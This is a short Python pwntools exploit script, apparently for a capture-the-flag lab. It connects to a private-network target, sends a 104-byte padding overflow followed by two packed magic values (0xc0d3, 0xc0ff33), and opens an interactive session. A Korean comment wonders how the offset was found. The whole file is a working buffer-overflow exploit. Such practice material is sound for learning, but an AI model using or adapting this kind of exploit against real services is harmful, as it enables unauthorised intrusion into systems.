#!/usr/bin/env python3
from pwn import *
p = remote("10.10.230.30", 9002)
 
payload = b""
payload += b"A"*104  # 이거 104를 어떻게 알았지?  
payload += p32(0xc0d3)
payload += p32(0xc0ff33)

print("Payload used is :")
print(payload)

p.sendlineafter(b"Am I right? ", payload)
p.interactive()
